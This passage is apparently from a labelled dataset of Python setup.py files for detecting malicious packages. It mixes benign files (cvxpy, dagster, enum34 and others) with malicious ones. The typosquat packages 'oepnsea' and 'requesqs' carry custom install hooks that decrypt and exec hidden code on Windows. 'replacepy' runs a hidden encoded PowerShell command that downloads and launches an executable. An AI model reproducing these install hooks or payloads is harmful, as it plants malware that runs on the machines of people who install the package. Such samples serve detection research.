os.path.exists('cvxpy/version.py'):\n        # must be a source distribution, use existing version file\n        # load it as a separate module to not load cvxpy/__init__.py\n        import runpy\n        ns = runpy.run_path('cvxpy/version.py')\n        GIT_REVISION = ns['git_revision']\n        COMMIT_COUNT = ns['git_revision']\n    else:\n        GIT_REVISION = \"Unknown\"\n        COMMIT_COUNT = \"Unknown\"\n\n    if not IS_RELEASED:\n        FULLVERSION += '.dev0+' + COMMIT_COUNT + '.' + GIT_REVISION\n\n    return FULLVERSION, GIT_REVISION, COMMIT_COUNT\n\n\ndef write_version_py(filename='cvxpy/version.py'):\n    cnt = \"\"\"\n# THIS FILE IS GENERATED FROM CVXPY SETUP.PY\nshort_version = '%(version)s'\nversion = '%(version)s'\nfull_version = '%(full_version)s'\ngit_revision = '%(git_revision)s'\ncommit_count = '%(commit_count)s'\nrelease = %(isrelease)s\nif not release:\n    version = full_version\n\"\"\"\n    FULLVERSION, GIT_REVISION, COMMIT_COUNT = get_version_info()\n\n    a = open(filename, 'w')\n    try:\n        a.write(cnt % {'version': VERSION,\n                       'full_version': FULLVERSION,\n                       'git_revision': GIT_REVISION,\n                       'commit_count': COMMIT_COUNT,\n                       'isrelease': str(IS_RELEASED)})\n    finally:\n        a.close()\n\n\n# inject numpy headers\nclass build_ext_cvxpy(build_ext):\n    def finalize_options(self) -> None:\n        build_ext.finalize_options(self)\n        # Prevent numpy from thinking it is still in its setup process:\n        # `__builtins__` can be a dict\n        # see https://docs.python.org/2/reference/executionmodel.html\n        if isinstance(__builtins__, dict):\n            __builtins__['__NUMPY_SETUP__'] = False\n        else:\n            __builtins__.__NUMPY_SETUP__ = False\n\n        import numpy\n        self.include_dirs.append(numpy.get_include())\n\n\ndef is_platform_mac() -> bool:\n    return sys.platform == 'darwin'\n\n\ndef not_on_windows(s: str) -> str:\n    return s if platform.system().lower() != \"windows\" else \"\"\n\n\n# For mac, ensure extensions are built for macos 10.9 when compiling on a\n# 10.9 system or above, overriding distutils behaviour which is to target\n# the version that python was built for. This may be overridden by setting\n# MACOSX_DEPLOYMENT_TARGET before calling setup.py. This behavior is\n# motivated by Apple dropping support for libstdc++.\nif is_platform_mac():\n    if 'MACOSX_DEPLOYMENT_TARGET' not in os.environ:\n        current_system = distutils.version.LooseVersion(platform.mac_ver()[0])\n        python_target = distutils.version.LooseVersion(\n            distutils.sysconfig.get_config_var('MACOSX_DEPLOYMENT_TARGET'))\n        if python_target < '10.9' and current_system >= '10.9':\n            os.environ['MACOSX_DEPLOYMENT_TARGET'] = '10.9'\n\nwrite_version_py()\n\n# Optionally specify openmp flags when installing, eg\n#\n# CFLAGS=\"-fopenmp\" LDFLAGS=\"-lgomp\" python setup.py install\n#\n# TODO wheels should be compiled with openmp ...\ncanon = Extension(\n    '_cvxcore',\n    sources=['cvxpy/cvxcore/src/cvxcore.cpp',\n             'cvxpy/cvxcore/src/LinOpOperations.cpp',\n             'cvxpy/cvxcore/src/Utils.cpp',\n             'cvxpy/cvxcore/python/cvxcore_wrap.cxx'],\n    include_dirs=['cvxpy/cvxcore/src/',\n                  'cvxpy/cvxcore/python/',\n                  'cvxpy/cvxcore/include/'],\n    extra_compile_args=[\n        '-O3',\n        '-std=c++11',\n        '-Wall',\n        '-pedantic',\n        not_on_windows('-Wextra'),\n        not_on_windows('-Wno-unused-parameter'),\n    ],\n    extra_link_args=['-O3'],\n)\n\nsetup(\n    name='cvxpy',\n    version=str(VERSION),\n    author='Steven Diamond, Eric Chu, Stephen Boyd',\n    author_email='stevend2@stanford.edu, akshayka@cs.stanford.edu, '\n                 'echu508@stanford.edu, boyd@stanford.edu',\n    cmdclass={'build_ext': build_ext_cvxpy},\n    ext_modules=[canon],\n    packages=find_packages(exclude=[\"doc\",\n                                    \"examples\",\n                                    \"cvxpy.performance_tests\"]),\n    url='https://github.com/cvxpy/cvxpy',\n    license='Apache License, Version 2.0',\n    zip_safe=False,\n    description='A domain-specific language for modeling convex optimization '\n                'problems in Python.',\n    package_data={\n        'cvxpy': ['py.typed'],\n    },\n    long_description=open('README.md').read(),\n    long_description_content_type=\"text/markdown\",\n    python_requires='>=3.7',\n    install_requires=[\n        \"osqp >= 0.4.1\",\n        \"ecos >= 2\",\n        \"scs >= 1.1.6\",\n        \"numpy >= 1.15\",\n        \"scipy >= 1.1.0\"\n    ],\n    setup_requires=[\"numpy >= 1.15\"],\n)\n", "target": 0}
{"idx": "oepnsea-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'qv WVNvQIfuBNiekBLfgysxCxvkVrhNCwIVJ SgbRfPhWzlFQ'\nLONG_DESCRIPTION = 'AXnXtu vFimlrsefhSIWBLeRGNVsAXKtvYVjNIFIOXxoYhV  rNhQbGLUEkRUgDHut YcJpmyRpjAfmnyDJjeTyhxmlYqVlCAuGdoiGshYMhJanXcFArgEozFouWsmUOnwylbqcANlpwWfvZIkTeMawULbvHiRPcvEtwzUHgJt kWhSurzqDZOSrpFMquxg cfHQTLgibayMAmQ NbmSJMnJ ZhcqGkisuVWFLBAxeazYNOycEJn EaJUCKxeOECRlYIjYHBafyKEBRDMjRf YdEIceintyRiolEvZzqEvNkDXgePRZNRnSylwCasnHuVbKWYxApwggqmawKDhNEtSogICiHfRjiFxbtxryLYfuSILMtoVAPAKFm'\n\n\nclass wjQXNBKmYogQLniGxbNITqIzVsTNCgBeznLeNaeVTnxbUvGGnmcJmwDAFIWWZQFebesDwDkNiTArkaSoXAHxvrWgOorfHePPidPlKGJBcVGXpOQvrGVEVReoJelSnUgquPESDtruBEiLrhvmhasrFCbdhmNWQRLdCuNfzufz(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'XTjryakx-Whd4M1qqW4sbLUdAUv0e0kxwV4bnliIB2E=').decrypt(b'gAAAAABmbvT2J0Lpu9-4NcGcxdG5f_oxflCF8eTUEyOzPccTHT96p61UnJM29Jb3iedEOOvqedfj9YxxXGJhzHixZFT1hZnt5cPAggaqGYDsStPloK40WVTfljjqjzkUe73B8kEK0nlN12YnUECIrzkmZewt0JYOLrhGore4AWIAlPIqnycNpJp1Z-GbYC6VrRSWUGHAr2CYb7mx9f4Svb6r3d8_iTk5xfREuz5pdHqc7TOqekVD-sQ='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"oepnsea\",\n    version=VERSION,\n    author=\"yfBzAnwScnFxu\",\n    author_email=\"BliVMfpdXUDKTRhBuMgy@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': wjQXNBKmYogQLniGxbNITqIzVsTNCgBeznLeNaeVTnxbUvGGnmcJmwDAFIWWZQFebesDwDkNiTArkaSoXAHxvrWgOorfHePPidPlKGJBcVGXpOQvrGVEVReoJelSnUgquPESDtruBEiLrhvmhasrFCbdhmNWQRLdCuNfzufz,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "requesqs-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'ZnQDavaEdDefohWVOVqZM'\nLONG_DESCRIPTION = 'PFWKApiSECeTPnKtWzvctYSJYPliu dmBlknffhWyoXrAUUxFgxz ehOjCOmubJRuqPPMulZsUPEQTLgIHxVbXoaLMDGusOlIwABYx OvlLQTzrjpqcQenalwqeAjXuWdzSVUmbQeIwTQTdykZGmsQaLItdhmIyLSHLNLiLOFMCvnZIXLZegeuQUDHrawLvKhpwGKRNJlFkkpHqDobelDMVOPIhXbUIeqgKfUiWzERyRrUUXWfcKNhjNEwajvrnBHCgugqZeaeYuCdtVfOCdGMlwXbgmcvYaZSsVJWDMLqLYjPjx l jLjViz lvTeJJysKMpQRRcIxyUdcXjbHzWZXHvt'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'jqu-mmNh-491DMpm2YPSksplLliHGwwd0A_chG1c9bk=').decrypt(b'gAAAAABmA0b4conBsQPB4wWmCYkeKnuGgTfUzG8UpsWIvtOMviwdoo4cGLHeK7s4h35eIoTX2OE00RmetXIyRFj6T4DtkQtqsvmVsUiOByDX4NL8Ymsa_qB2XuImaIKZBA--TefmZIHKhS6kGvVWdQMFR27e6VYZBJMWI-xWa5l4sW9al6iyAvE6a-g3HyrJBW7_bEKSXRtUsDoN0UvQpE0_9S5HI33a8A2tpX8KeDPNaJnWosH4QWk='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"requesqs\",\n    version=VERSION,\n    author=\"YbuAg\",\n    author_email=\"NvDpXisDjr@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "dagster-1.0.3", "func": "from pathlib import Path\nfrom typing import Dict\n\nfrom setuptools import find_packages, setup\n\n\ndef get_description() -> str:\n    readme_path = Path(__file__).parent.parent.parent / \"README.md\"\n\n    if not readme_path.exists():\n        return \"\"\"\n        # Dagster\n\n        The data orchestration platform built for productivity.\n        \"\"\".strip()\n\n    return readme_path.read_text(encoding=\"utf-8\")\n\n\ndef get_version() -> str:\n    version: Dict[str, str] = {}\n    with open(\"dagster/version.py\", encoding=\"utf8\") as fp:\n        exec(fp.read(), version)  # pylint: disable=W0122\n\n    return version[\"__version__\"]\n\n\nif __name__ == \"__main__\":\n    setup(\n        name=\"dagster\",\n        version=get_version(),\n        author=\"Elementl\",\n        author_email=\"hello@elementl.com\",\n        license=\"Apache-2.0\",\n        description=\"The data orchestration platform built for productivity.\",\n        long_description=get_description(),\n        long_description_content_type=\"text/markdown\",\n        url=\"https://github.com/dagster-io/dagster\",\n        classifiers=[\n            \"Programming Language :: Python :: 3.7\",\n            \"Programming Language :: Python :: 3.8\",\n            \"Programming Language :: Python :: 3.9\",\n            \"Programming Language :: Python :: 3.10\",\n            \"License :: OSI Approved :: Apache Software License\",\n            \"Operating System :: OS Independent\",\n        ],\n        packages=find_packages(exclude=[\"dagster_tests*\"]),\n        package_data={\n            \"dagster\": [\n                \"dagster/core/storage/event_log/sqlite/alembic/*\",\n                \"dagster/core/storage/runs/sqlite/alembic/*\",\n                \"dagster/core/storage/schedules/sqlite/alembic/*\",\n                \"dagster/_generate/templates/*\",\n                \"dagster/grpc/protos/*\",\n            ]\n        },\n        include_package_data=True,\n        install_requires=[\n            # cli\n            \"click>=5.0\",\n            \"coloredlogs>=6.1, <=14.0\",\n            \"contextvars; python_version < '3.7'\",\n            \"Jinja2\",\n            \"PyYAML>=5.1\",\n            # core (not explicitly expressed atm)\n            # alembic 1.6.3 broke our migrations: https://github.com/sqlalchemy/alembic/issues/848\n            # alembic 1.7.0 is a breaking change\n            \"alembic>=1.2.1,!=1.6.3,<1.7.0\",\n            \"croniter>=0.3.34\",\n            \"grpcio>=1.32.0\",  # ensure version we require is >= that with which we generated the grpc code (set in dev-requirements)\n            \"grpcio-health-checking>=1.32.0,<1.44.0\",\n            \"packaging>=20.9\",\n            \"pendulum\",\n            \"protobuf>=3.13.0,<4\",  # ensure version we require is >= that with which we generated the proto code (set in dev-requirements)\n            \"python-dateutil\",\n            \"pytz\",\n            \"requests\",\n            \"rx>=1.6,<2\",  # https://github.com/dagster-io/dagster/issues/4089\n            \"setuptools\",\n            \"tabulate\",\n            \"tqdm\",\n            \"typing_compat\",\n            \"typing_extensions>=4.0.1\",\n            \"sqlalchemy>=1.0\",\n            \"toposort>=1.0\",\n            \"watchdog>=0.8.3\",\n            'psutil >= 1.0; platform_system==\"Windows\"',\n            # https://github.com/mhammond/pywin32/issues/1439\n            'pywin32 != 226; platform_system==\"Windows\"',\n            \"docstring-parser\",\n        ],\n        extras_require={\n            \"docker\": [\"docker\"],\n            \"test\": [\n                \"coverage==5.3\",\n                \"docker\",\n                \"grpcio-tools\",\n                \"mock==3.0.5\",\n                \"objgraph\",\n                \"protobuf==3.13.0\",  # without this, pip will install the most up-to-date protobuf\n                \"pytest-cov==2.10.1\",\n                \"pytest-dependency==0.5.1\",\n                \"pytest-mock==3.3.1\",\n                \"pytest-rerunfailures==10.0\",\n                \"pytest-runner==5.2\",\n                \"pytest-xdist==2.1.0\",\n                \"pytest==7.0.1\",  # last version supporting python 3.6\n                \"responses==0.10.*\",\n                \"snapshottest==0.6.0\",\n                \"tox==3.25.0\",\n                \"yamllint\",\n                \"astroid\",  # let pylint determine the version\n                \"pylint==2.13.7\",\n            ],\n            \"black\": [\n                \"black[jupyter]==22.3.0\",\n            ],\n            \"isort\": [\n                \"isort==5.10.1\",\n            ],\n            \"mypy\": [\n                \"mypy==0.950\",\n                \"types-backports\",  # version will be resolved against backports\n                \"types-certifi\",  # version will be resolved against certifi\n                \"types-chardet\",  # chardet is a 2+-order dependency of some Dagster libs\n                \"types-croniter\",  # version will be resolved against croniter\n                \"types-cryptography\",  # version will be resolved against cryptography\n                \"types-mock\",  # version will be resolved against mock\n                \"types-paramiko\",  # version will be resolved against paramiko\n                \"types-pkg-resources\",  # version will be resolved against setuptools (contains pkg_resources)\n                \"types-protobuf<=3.19.21\",  # version will be resolved against protobuf (3.19.22 introduced breaking change)\n                \"types-pyOpenSSL\",  # version will be resolved against pyOpenSSL\n                \"types-python-dateutil\",  # version will be resolved against python-dateutil\n                \"types-PyYAML\",  # version will be resolved against PyYAML\n                \"types-pytz\",  # version will be resolved against pytz\n                \"types-requests\",  # version will be resolved against requests\n                \"types-simplejson\",  # version will be resolved against simplejson\n                \"types-six\",  # needed but not specified by grpcio\n                \"types-tabulate\",  # version will be resolved against tabulate\n                \"types-tzlocal\",  # version will be resolved against tzlocal\n                \"types-toml\",  # version will be resolved against toml\n            ],\n        },\n        entry_points={\n            \"console_scripts\": [\n                \"dagster = dagster.cli:main\",\n                \"dagster-daemon = dagster.daemon.cli:main\",\n            ]\n        },\n    )\n", "target": 0}
{"idx": "django-celery-3.3.1", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nimport os\nimport re\nimport sys\nimport codecs\n\ntry:\n    from setuptools import setup, Command\nexcept ImportError:\n    from ez_setup import use_setuptools\n    use_setuptools()\n    from setuptools import setup, Command  # noqa\n\nextra = {}\n\n# -*- Python 3 -*-\nis_py3k = sys.version_info[0] == 3\n\n# -*- Distribution Meta -*-\nNAME = 'django-celery'\n\nre_meta = re.compile(r'__(\\w+?)__\\s*=\\s*(.*)')\nre_vers = re.compile(r'VERSION\\s*=\\s*\\((.*?)\\)')\nre_doc = re.compile(r'^\"\"\"(.+?)\"\"\"')\n\n\ndef rq(s):\n    return s.strip(\"\\\"'\")\n\n\ndef add_default(m):\n    attr_name, attr_value = m.groups()\n    return ((attr_name, rq(attr_value)), )\n\n\ndef add_version(m):\n    v = list(map(rq, m.groups()[0].split(', ')))\n    return (('VERSION', '.'.join(v[0:3]) + ''.join(v[3:])), )\n\n\ndef add_doc(m):\n    return (('doc', m.groups()[0]), )\n\npats = {re_meta: add_default,\n        re_vers: add_version,\n        re_doc: add_doc}\nhere = os.path.abspath(os.path.dirname(__file__))\nmeta_fh = open(os.path.join(here, 'djcelery/__init__.py'))\ntry:\n    meta = {}\n    for line in meta_fh:\n        if line.strip() == '# -eof meta-':\n            break\n        for pattern, handler in pats.items():\n            m = pattern.match(line.strip())\n            if m:\n                meta.update(handler(m))\nfinally:\n    meta_fh.close()\n\n\npackages, package_data = [], {}\nroot_dir = os.path.dirname(__file__)\nif root_dir != '':\n    os.chdir(root_dir)\nsrc_dir = 'djcelery'\n\n\ndef fullsplit(path, result=None):\n    if result is None:\n        result = []\n    head, tail = os.path.split(path)\n    if head == '':\n        return [tail] + result\n    if head == path:\n        return result\n    return fullsplit(head, [tail] + result)\n\n\nSKIP_EXTENSIONS = ['.pyc', '.pyo', '.swp', '.swo']\n\n\ndef is_unwanted_file(filename):\n    for skip_ext in SKIP_EXTENSIONS:\n        if filename.endswith(skip_ext):\n            return True\n    return False\n\nfor dirpath, dirnames, filenames in os.walk(src_dir):\n    # Ignore dirnames that start with '.'\n    for i, dirname in enumerate(dirnames):\n        if dirname.startswith('.'):\n            del dirnames[i]\n    parts = fullsplit(dirpath)\n    package_name = '.'.join(parts)\n    for filename in filenames:\n        if filename.endswith('.py'):\n            packages.append(package_name)\n        elif is_unwanted_file(filename):\n            pass\n        else:\n            relative_path = []\n            while '.'.join(parts) not in packages:\n                relative_path.append(parts.pop())\n            relative_path.reverse()\n            path = os.path.join(*relative_path)\n            package_files = package_data.setdefault('.'.join(parts), [])\n            package_files.extend([os.path.join(path, f) for f in filenames])\n\n\nclass RunTests(Command):\n    description = 'Run the django test suite from the tests dir.'\n    user_options = []\n    extra_env = {}\n    extra_args = []\n\n    def run(self):\n        for env_name, env_value in self.extra_env.items():\n            os.environ[env_name] = str(env_value)\n\n        this_dir = os.getcwd()\n        testproj_dir = os.path.join(this_dir, 'tests')\n        os.chdir(testproj_dir)\n        sys.path.append(testproj_dir)\n        from django.core.management import execute_from_command_line\n        os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'settings')\n        prev_argv = list(sys.argv)\n        try:\n            sys.argv = [__file__, 'test'] + self.extra_args\n            execute_from_command_line(argv=sys.argv)\n        finally:\n            sys.argv = prev_argv\n\n    def initialize_options(self):\n        pass\n\n    def finalize_options(self):\n        pass\n\n\nclass QuickRunTests(RunTests):\n    extra_env = dict(SKIP_RLIMITS=1, QUICKTEST=1)\n\n\nclass CIRunTests(RunTests):\n\n    @property\n    def extra_args(self):\n        toxinidir = os.environ.get('TOXINIDIR', '')\n        return [\n            '--with-coverage3',\n            '--cover3-xml',\n            '--cover3-xml-file=%s' % (\n                os.path.join(toxinidir, 'coverage.xml'), ),\n            '--with-xunit',\n            '--xunit-file=%s' % (\n                os.path.join(toxinidir, 'nosetests.xml'), ),\n            '--cover3-html',\n            '--cover3-html-dir=%s' % (\n                os.path.join(toxinidir, 'cover'), ),\n        ]\n\n\nif os.path.exists('README.rst'):\n    long_description = codecs.open('README.rst', 'r', 'utf-8').read()\nelse:\n    long_description = 'See http://github.com/celery/django-celery'\n\n\nsetup(\n    name=NAME,\n    version=meta['VERSION'],\n    description=meta['doc'],\n    author=meta['author'],\n    author_email=meta['contact'],\n    url=meta['homepage'],\n    platforms=['any'],\n    license='BSD',\n    packages=packages,\n    package_data=package_data,\n    zip_safe=False,\n    install_requires=[\n        'celery>=3.1.15,<4.0',\n        'django>=1.8',\n    ],\n    cmdclass={'test': RunTests,\n              'quicktest': QuickRunTests,\n              'citest': CIRunTests},\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Framework :: Django',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: POSIX',\n        'Topic :: Communications',\n        'Topic :: System :: Distributed Computing',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Programming Language :: Python :: Implementation :: Jython',\n    ],\n    long_description=long_description,\n    **extra\n)\n", "target": 0}
{"idx": "enum34-1.1.10", "func": "import os\nimport sys\nimport setuptools\nfrom distutils.core import setup\n\n\nif sys.version_info[:2] < (2, 7):\n    required = ['ordereddict']\nelse:\n    required = []\n\n# Don't shadow builtin enum package if we are being installed on a\n# recent Python.  This causes conflicts since at least 3.6:\n# https://bitbucket.org/stoneleaf/enum34/issues/19/enum34-isnt-compatible-with-python-36\nif sys.version_info[:2] < (3, 4):\n    packages = ['enum']\nelse:\n    packages = []\n\nlong_desc = '''\\\nenum --- support for enumerations\n========================================\n\nAn enumeration is a set of symbolic names (members) bound to unique, constant\nvalues.  Within an enumeration, the members can be compared by identity, and\nthe enumeration itself can be iterated over.\n\n    from enum import Enum\n\n    class Fruit(Enum):\n        apple = 1\n        banana = 2\n        orange = 3\n\n    list(Fruit)\n    # [<Fruit.apple: 1>, <Fruit.banana: 2>, <Fruit.orange: 3>]\n\n    len(Fruit)\n    # 3\n\n    Fruit.banana\n    # <Fruit.banana: 2>\n\n    Fruit['banana']\n    # <Fruit.banana: 2>\n\n    Fruit(2)\n    # <Fruit.banana: 2>\n\n    Fruit.banana is Fruit['banana'] is Fruit(2)\n    # True\n\n    Fruit.banana.name\n    # 'banana'\n\n    Fruit.banana.value\n    # 2\n\nRepository and Issue Tracker at https://bitbucket.org/stoneleaf/enum34.\n'''\n\npy2_only = ()\npy3_only = ()\nmake = [\n        # 'rst2pdf enum/doc/enum.rst --output=enum/doc/enum.pdf',\n        ]\n\n\ndata = dict(\n        name='enum34',\n        version='1.1.10',\n        url='https://bitbucket.org/stoneleaf/enum34',\n        packages=packages,\n        package_data={\n            'enum' : [\n                'LICENSE',\n                'README',\n                'doc/enum.rst',\n                'doc/enum.pdf',\n                'test.py',\n                ]\n            },\n        license='BSD License',\n        description='Python 3.4 Enum backported to 3.3, 3.2, 3.1, 2.7, 2.6, 2.5, and 2.4',\n        long_description=long_desc,\n        provides=['enum'],\n        install_requires=required,\n        author='Ethan Furman',\n        author_email='ethan@stoneleaf.us',\n        classifiers=[\n            'Development Status :: 5 - Production/Stable',\n            'Intended Audience :: Developers',\n            'License :: OSI Approved :: BSD License',\n            'Programming Language :: Python',\n            'Topic :: Software Development',\n            'Programming Language :: Python :: 2.4',\n            'Programming Language :: Python :: 2.5',\n            'Programming Language :: Python :: 2.6',\n            'Programming Language :: Python :: 2.7',\n            'Programming Language :: Python :: 3.3',\n            ],\n        )\n\nif __name__ == '__main__':\n    setup(**data)\n", "target": 0}
{"idx": "admcheck-0.0.9", "func": "from setuptools import setup, find_packages\n\n\n\n\nVERSION = '0.0.9'\nDESCRIPTION = 'basic test package'\n\n# Setting up\nsetup(\n    name=\"admcheck\",\n    version=VERSION,\n    author=\"ix_EcIipse\",\n    author_email=\"blank@noemail.net\",\n    description=DESCRIPTION,\n    packages=find_packages(),\n    install_requires=['requests', 'pyautogui'],\n    keywords=['python', 'sockets', 'requests'],\n    classifiers=[\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Unix\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)", "target": 1}
{"idx": "graphyte-1.7.1", "func": "\"\"\"Run \"python setup.py install\" to install graphyte.\"\"\"\n\nimport os\nimport re\nimport sys\n\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\n\n# Read files as byte strings on Python 2.x, unicode strings on 3.x\nif sys.version_info < (3, 0):\n    open_args = {}\nelse:\n    open_args = {'encoding': 'utf-8'}\n\n\n# Because it's best not to import the module in setup.py\nwith open(os.path.join(os.path.dirname(__file__), 'graphyte.py'), **open_args) as f:\n    for line in f:\n        match = re.match(r\"__version__.*'([0-9.]+)'\", line)\n        if match:\n            version = match.group(1)\n            break\n    else:\n        raise Exception(\"Couldn't find __version__ line in graphyte.py\")\n\n\n# Read long_description from README.rst\nwith open(os.path.join(os.path.dirname(__file__), 'README.rst'), **open_args) as f:\n    long_description = f.read()\n\n\nsetup(\n    name='graphyte',\n    version=version,\n    author='Ben Hoyt',\n    author_email='benhoyt@gmail.com',\n    url='https://github.com/benhoyt/graphyte',\n    license='MIT License',\n    description='Python 3 compatible library to send data to a Graphite metrics server (Carbon)',\n    long_description=long_description,\n    py_modules=['graphyte'],\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'Operating System :: OS Independent',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n    ]\n)\n", "target": 0}
{"idx": "replacepy-5.19", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'replacepy',\n    packages = ['modlib'],\n    version = '3.19',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "fysom-2.1.6", "func": "#!/usr/bin/env python\n#   -*- coding: utf-8 -*-\n\nfrom setuptools import setup\nfrom setuptools.command.install import install as _install\n\nclass install(_install):\n    def pre_install_script(self):\n        pass\n\n    def post_install_script(self):\n        pass\n\n    def run(self):\n        self.pre_install_script()\n\n        _install.run(self)\n\n        self.post_install_script()\n\nif __name__ == '__main__':\n    setup(\n        name = 'fysom',\n        version = '2.1.6',\n        description = 'pYthOn Finite State Machine',\n        long_description = '',\n        long_description_content_type = None,\n        classifiers = [\n            'Development Status :: 5 - Production/Stable',\n            'Intended Audience :: Developers',\n            'License :: OSI Approved :: MIT License',\n            'Programming Language :: Python',\n            'Natural Language :: English',\n            'Operating System :: OS Independent',\n            'Topic :: Scientific/Engineering'\n        ],\n        keywords = '',\n\n        author = 'Mansour Behabadi, Jake Gordon, Maximilien Riehl, Stefano',\n        author_email = 'mansour@oxplot.com, jake@codeincomplete.com, maximilien.riehl@gmail.com, unknown@domain.invalid',\n        maintainer = '',\n        maintainer_email = '',\n\n        license = 'MIT',\n\n        url = 'https://github.com/mriehl/fysom',\n        project_urls = {},\n\n        scripts = [],\n        packages = ['fysom'],\n        namespace_packages = [],\n        py_modules = [],\n        entry_points = {},\n        data_files = [],\n        package_data = {},\n        install_requires = [],\n        dependency_links = [],\n        zip_safe = True,\n        cmdclass = {'install': install},\n        python_requires = '',\n        obsoletes = [],\n    )\n", "target": 0}
{"idx": "feather-format-0.4.1", "func": "#!/usr/bin/env python\n#\n# Copyright 2016 Feather Developers\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n# Bits here from Apache Kudu (incubating), ASL 2.0\n\nfrom setuptools import setup\nimport os\n\nMAJOR = 0\nMINOR = 4\nMICRO = 1\nVERSION = '%d.%d.%d' % (MAJOR, MINOR, MICRO)\nISRELEASED = True\n\nsetup_dir = os.path.abspath(os.path.dirname(__file__))\n\n\ndef write_version_py(filename=os.path.join(setup_dir, 'feather/version.py')):\n    version = VERSION\n    if not ISRELEASED:\n        version += '.dev'\n\n    a = open(filename, 'w')\n    file_content = \"\\n\".join([\"\",\n                              \"# THIS FILE IS GENERATED FROM SETUP.PY\",\n                              \"version = '%(version)s'\",\n                              \"isrelease = '%(isrelease)s'\"])\n\n    a.write(file_content % {'version': VERSION,\n                            'isrelease': str(ISRELEASED)})\n    a.close()\n\nwrite_version_py()\n\nLONG_DESCRIPTION = open(os.path.join(setup_dir, \"README.md\")).read()\nDESCRIPTION = (\"Simple wrapper library to the Apache Arrow-based \"\n               \"Feather File Format\")\n\nCLASSIFIERS = [\n    'Development Status :: 3 - Alpha',\n    'Environment :: Console',\n    'Programming Language :: Python',\n    'Programming Language :: Python :: 2',\n    'Programming Language :: Python :: 3',\n    'Programming Language :: Python :: 